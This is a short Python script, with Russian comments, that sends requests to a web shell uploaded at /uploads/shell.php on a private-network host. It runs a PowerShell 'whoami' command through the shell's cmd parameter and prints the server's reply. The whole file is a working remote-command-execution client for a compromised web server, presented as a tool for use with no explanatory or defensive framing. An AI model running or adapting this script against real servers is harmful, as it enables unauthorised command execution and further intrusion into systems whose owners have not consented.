#!/usr/bin/python3
import requests
from urllib.parse import quote

try:
    # Конфигурационные параметры
    target_host = "http://192.168.0.174"  # Целевой хост

    # Формируем полный URL
    url = f'{target_host}/uploads/shell.php?cmd=powershell+-c+"whoami"'
    
    # Заголовки запроса
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36",
        "Host": "192.168.0.174",
        "Connection": "close"
    }

    print(f"[*] Sending request...")
    
    # Отправляем GET-запрос
    response = requests.get(
        url,
        headers=headers
    )

    print(f"[+] Response status: {response.status_code}")
    print("[+] Response content:")
    print(response.text)

except requests.exceptions.RequestException as e:
    print(f"[-] Request error: {e}")
except Exception as e:
    print(f"[-] Error: {e}")